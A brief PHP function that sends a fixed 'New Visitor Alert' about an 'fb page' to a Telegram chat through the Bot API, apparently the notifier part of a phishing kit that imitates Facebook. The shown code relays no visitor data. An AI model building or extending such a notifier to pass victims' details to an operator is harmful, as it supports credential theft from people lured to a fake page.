<?php
function sendToTelegram($id, $userData, $tele) {

    $telegramMessage = "====>🔥 New Visitor Alert! 🔥<====\n\n";
    $telegramMessage .= "You have a new visitor on your fb page 🚀.\n";
    $telegramMessage .= "|===> PULUMBU INC. <===|\n";

    $telegramUrl = "https://api.telegram.org/bot{$tele['telegram_bot_token']}/sendMessage";
    $telegramData = [
        'chat_id' => $tele['telegram_chat_id'],
        'text' => $telegramMessage
    ];
    $response = @file_get_contents($telegramUrl . "?" . http_build_query($telegramData));
    if ($response === FALSE) {
        error_log("Failed to send message to Telegram.");
    }
}
?>